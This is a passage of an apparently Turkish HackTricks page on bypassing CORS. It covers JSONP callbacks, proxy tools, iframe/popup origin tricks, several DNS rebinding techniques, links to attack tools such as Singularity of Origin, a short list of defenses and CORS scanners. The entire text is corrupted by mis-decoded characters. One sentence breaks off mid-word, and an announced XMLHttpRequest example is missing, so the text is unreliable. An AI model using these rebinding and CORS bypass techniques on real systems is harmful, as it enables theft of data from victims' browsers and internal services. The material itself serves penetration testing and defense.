Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± daha iyi anlamak ve azaltmak iÃ§in, web uygulamalarÄ±nÄ±zdaki potansiyel XSSI gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmenize ve ele almanÄ±za yardÄ±mcÄ± olabilecek BurpSuite eklentisini kullanabilirsiniz. Eklentiye [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) adresinden eriÅŸebilirsiniz.

[**FarklÄ± XSSI tÃ¼rleri hakkÄ±nda ve nasÄ±l istismar edileceÄŸi hakkÄ±nda daha fazla bilgi iÃ§in burayÄ± okuyun.**](xssi-cross-site-script-inclusion.md)

Ä°steÄŸe bir **`callback`** **parametresi** eklemeyi deneyin. Belki sayfa verileri JSONP olarak gÃ¶ndermek iÃ§in hazÄ±rlanmÄ±ÅŸtÄ±r. Bu durumda, sayfa verileri `Content-Type: application/javascript` ile geri gÃ¶nderilecektir ve CORS politikasÄ±nÄ± atlatÄ±r.

![](<../.gitbook/assets/image (229).png>)

### Kolay (faydasÄ±z?) atlatma

`Access-Control-Allow-Origin` kÄ±sÄ±tlamasÄ±nÄ± atlatmanÄ±n bir yolu, bir web uygulamasÄ±ndan sizin adÄ±nÄ±za bir istek yapmasÄ±nÄ± ve yanÄ±tÄ± geri gÃ¶ndermesini istemektir. Ancak bu senaryoda, son kurbanÄ±n kimlik bilgileri farklÄ± bir etki alanÄ±na yapÄ±lan istek nedeniyle gÃ¶nderilmez.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Bu araÃ§, isteÄŸinizi baÅŸlÄ±klarÄ±yla birlikte yÃ¶nlendiren bir proxy saÄŸlar ve aynÄ± zamanda Origin baÅŸlÄ±ÄŸÄ±nÄ± istenen etki alanÄ±yla eÅŸleÅŸtirmek iÃ§in sahte bir Origin baÅŸlÄ±ÄŸÄ± oluÅŸturur. Bu, CORS politikasÄ±nÄ± etkili bir ÅŸekilde atlatÄ±r. Ä°ÅŸte XMLHttpRequest ile kullanÄ±m Ã¶rneÄŸi:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Bu araÃ§, istekleri proxy olarak yÃ¶nlendirmek yerine sunucu kendi parametreleriyle kendi isteÄŸini yapar.

### Iframe + Popup Atlatma

`e.origin === window.origin` gibi CORS kontrol noktalarÄ±nÄ± **iframe oluÅŸturarak** ve **onun Ã¼zerinden yeni bir pencere aÃ§arak** atlayabilirsiniz. Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL ile DNS Rebinding

TTL ile DNS rebinding, DNS kayÄ±tlarÄ±nÄ± manipÃ¼le ederek belirli gÃ¼venlik Ã¶nlemlerini atlatmak iÃ§in kullanÄ±lan bir tekniktir. Ä°ÅŸleyiÅŸi aÅŸaÄŸÄ±daki gibidir:

1. SaldÄ±rgan bir web sayfasÄ± oluÅŸturur ve kurbanÄ±n buna eriÅŸmesini saÄŸlar.
2. SaldÄ±rgan daha sonra kendi etki alanÄ±nÄ±n DNS (IP) adresini kurbanÄ±n web sayfasÄ±na yÃ¶nlendirmek iÃ§in deÄŸiÅŸtirir.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± DNS yanÄ±tÄ±nÄ± Ã¶nbelleÄŸe alÄ±r ve DNS kaydÄ±nÄ±n ne kadar sÃ¼reyle geÃ§erli olacaÄŸÄ±nÄ± belirten bir TTL (YaÅŸam SÃ¼resi) deÄŸeri olabilir.
4. TTL sÃ¼resi dolduÄŸunda, kurbanÄ±n tarayÄ±cÄ±sÄ± yeni bir DNS isteÄŸi yapar, bu da saldÄ±rganÄ±n kurbanÄ±n sayfasÄ±nda JavaScript kodunu yÃ¼rÃ¼tmesine olanak tanÄ±r.
5. SaldÄ±rgan, kurbanÄ±n IP adresi Ã¼zerinde kontrolÃ¼ sÃ¼rdÃ¼rerek, kurbandan herhangi bir Ã§erez gÃ¶ndermeden kurbandan bilgi toplayabilir.

Bu teknik, tarayÄ±cÄ±larÄ±n dÃ¼ÅŸÃ¼k TTL deÄŸerleriyle bile bu teknikten hemen yararlanmayÄ± Ã¶nleyebilecek Ã¶nbellekleme mekanizmalarÄ±na sahip olduÄŸunu unutmak Ã¶nemlidir.

DNS rebinding, kurban tarafÄ±ndan gerÃ§ekleÅŸtirilen aÃ§Ä±k IP kontrol noktalarÄ±nÄ± atlamak veya bir kullanÄ±cÄ±nÄ±n veya botun uzun bir sÃ¼re aynÄ± sayfada kalmasÄ± durumunda Ã¶nbelleÄŸin sÃ¼resinin dolmasÄ±na izin veren senaryolar iÃ§in kullanÄ±ÅŸlÄ± olabilir.

DNS rebinding'i hÄ±zlÄ± bir ÅŸekilde istismar etmek iÃ§in [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) gibi hizmetleri kullanabilirsiniz.

Kendi DNS rebinding sunucunuzu Ã§alÄ±ÅŸtÄ±rmak iÃ§in **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) gibi araÃ§larÄ± kullanabilirsiniz. Bu, yerel 53/udp baÄŸlantÄ± noktanÄ±zÄ± aÃ§Ä±ÄŸa Ã§Ä±karmanÄ±zÄ±, ona iÅŸaret eden bir A kaydÄ± oluÅŸturmanÄ±zÄ± (Ã¶rneÄŸin ns.example.com) ve daha Ã¶nce oluÅŸturulan A alt alan adÄ±na iÅŸaret eden bir NS kaydÄ± oluÅŸturmanÄ±zÄ± (Ã¶rneÄŸin ns.example.com) iÃ§erir. ns.example.com alt alanÄ±nÄ±n herhangi bir alt alanÄ± daha sonra ana bilgisayarÄ±nÄ±z tarafÄ±ndan Ã§Ã¶zÃ¼mlenecektir.

Daha fazla anlama ve deney yapma iÃ§in [http://rebind.it/singularity.html](http://rebind.it/singularity.html) adresinde halka aÃ§Ä±k Ã§alÄ±ÅŸan bir sunucuyu keÅŸfedebilirsiniz.

### DNS Rebinding via **DNS Cache Flooding**

DNS Ã¶nbelleÄŸini sular altÄ±nda bÄ±rakarak DNS Ã¶nbellekleme mekanizmasÄ±nÄ± atlatmak iÃ§in kullanÄ±lan baÅŸka bir teknik DNS rebinding via DNS cache flooding'dir. Ä°ÅŸleyiÅŸi aÅŸaÄŸÄ±daki gibidir:

1. Ä°lk olarak, kurban bir DNS isteÄŸi yapar ve saldÄ±rganÄ±n IP adresiyle yanÄ±t alÄ±r.
2. Ã–nbellekleme savunmasÄ±nÄ± atlamak iÃ§in saldÄ±rgan bir hizmet Ã§alÄ±ÅŸtÄ±rÄ±r. Hizmet Ã§alÄ±ÅŸtÄ±rÄ±cÄ± DNS Ã¶nbelleÄŸini sular altÄ±nda bÄ±rakÄ±r ve Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ saldÄ±rgan sunucu adÄ±nÄ± siler.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± ikinci bir DNS isteÄŸi yapar ve bu sefer genellikle yerel ana bilgisayarÄ± iÅŸaret eden IP adresi 127.0.0.1 ile yanÄ±t alÄ±r.

Servis Ã§alÄ±ÅŸtÄ±rÄ±cÄ±sÄ± tarafÄ±ndan DNS Ã¶nbelleÄŸini sular altÄ±nda bÄ±rakarak, saldÄ±rgan DNS Ã§Ã¶zÃ¼mleme sÃ¼recini manipÃ¼le edebilir ve kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ±n ikinci bir istekte bulunmasÄ±nÄ± zorlayabilir, bu sefer saldÄ±rganÄ±n istenen IP adresine Ã§Ã¶zÃ¼lÃ¼r.

### DNS Rebinding via **Ã–nbellek**

Ã–nbellekleme savunmasÄ±nÄ± atlatmanÄ±n baÅŸka bir yolu, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan iÃ§in birden fazla IP adresi kullanmaktÄ±r. Ä°ÅŸleyiÅŸi aÅŸaÄŸÄ±daki gibidir:

1. SaldÄ±rgan, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan iÃ§in iki A kaydÄ± (veya iki IP'li tek bir A kaydÄ±) ayarlar.
2. Bir tarayÄ±cÄ± bu kayÄ±tlarÄ± kontrol ettiÄŸinde, her iki IP adresini de alÄ±r.
3. TarayÄ±cÄ± saldÄ±rganÄ±n IP adresini ilk olarak kullanmaya karar verirse, saldÄ±rgan aynÄ± etki alanÄ±na HTTP istekleri gerÃ§ekleÅŸtiren bir yÃ¼k yÃ¼kleyebilir.
4. Ancak saldÄ±rgan kurbanÄ±n IP adresini elde ettikten sonra, kurbanÄ±n tarayÄ±cÄ±sÄ±na yanÄ±t vermekten vazgeÃ§er.
5. Etki alanÄ±nÄ±n yanÄ±t vermediÄŸini fark eden kurbanÄ±n tarayÄ±cÄ±sÄ±, ikinci verilen IP adresini kullanmaya devam eder.
6. Ä°kinci IP adresine eriÅŸerek, tarayÄ±cÄ± AynÄ± KÃ¶ken PolitikasÄ±'nÄ± (SOP) atlar ve saldÄ±rgan bu durumu istismar ederek kurbandan bilgi toplayabilir ve dÄ±ÅŸarÄ±ya sÄ±zdÄ±rabilir.

Bu teknik, birden fazla IP adresinin bir etki alanÄ± iÃ§in saÄŸlandÄ±ÄŸÄ±nda tarayÄ±cÄ±larÄ±n davranÄ±ÅŸÄ±nÄ± kullanÄ±r. YanÄ±
### DiÄŸer YaygÄ±n GeÃ§iÅŸler

* **Dahili IP'ler izin verilmiyorsa**, muhtemelen **0.0.0.0 yasaÄŸÄ± unutulmuÅŸ olabilir** (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* **Dahili IP'ler izin verilmiyorsa**, **localhost** iÃ§in bir **CNAME** ile yanÄ±t verin (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* **Dahili IP'ler DNS yanÄ±tlarÄ±na izin verilmiyorsa**, www.corporate.internal gibi **dahili servislere CNAME yanÄ±tlarÄ±** verebilirsiniz.

### DNS Rebidding SilahlandÄ±rÄ±lmÄ±ÅŸ

Ã–nceki geÃ§iÅŸ teknikleri hakkÄ±nda daha fazla bilgi ve aÅŸaÄŸÄ±daki aracÄ± nasÄ±l kullanacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 KonferansÄ±](https://www.youtube.com/watch?v=y9-0lICNjOQ) konuÅŸmasÄ±na bakabilirsiniz.

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity), [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§tÄ±r. SaldÄ±rÄ± sunucusunun DNS adÄ±nÄ±n IP adresini hedef makinenin IP adresine yeniden baÄŸlamak ve hedef makinedeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in saldÄ±rÄ± yÃ¼klerini sunmak iÃ§in gerekli bileÅŸenleri iÃ§erir.

### DNS Rebinding'e KarÅŸÄ± GerÃ§ek Koruma

* Dahili servislerde TLS kullanÄ±n
* Verilere eriÅŸmek iÃ§in kimlik doÄŸrulama isteyin
* Host baÅŸlÄ±ÄŸÄ±nÄ± doÄŸrulayÄ±n
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Genel sunucularÄ±n dahili sunuculara eriÅŸmek istediÄŸinde her zaman bir Ã¶n uÃ§uÅŸ isteÄŸi gÃ¶ndermek iÃ§in Ã¶neri

## **AraÃ§lar**

**CORS politikalarÄ±ndaki olasÄ± yapÄ±landÄ±rma hatalarÄ±nÄ± taramak iÃ§in Fuzz**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referanslar
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **tanÄ±tmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
